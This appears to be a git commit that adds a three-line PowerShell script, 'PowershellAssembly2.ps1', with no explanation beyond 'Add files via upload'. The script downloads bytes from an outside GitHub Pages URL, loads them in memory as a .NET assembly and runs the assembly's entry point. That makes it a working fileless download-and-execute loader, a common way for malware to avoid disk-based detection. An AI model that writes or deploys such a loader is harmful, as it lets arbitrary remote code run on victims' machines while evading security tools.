f83d41a2decff4d4063f3eff89f8f142b19cd072
HakkYahud <108320420+HakkYahud@users.noreply.github.com>
2023-07-04 17:00:55 +0200

    Add files via upload

---
+++ PowershellAssembly2.ps1
@@ -0,0 +1,3 @@
+﻿$assemblyByte = (New-Object Net.WebClient).DownloadData("https://hakkyahud.github.io/SpecialCake4Teh");
+$assembly = [System.Reflection.Assembly]::Load($assemblyByte);
+$assembly.EntryPoint.Invoke($null, $null)
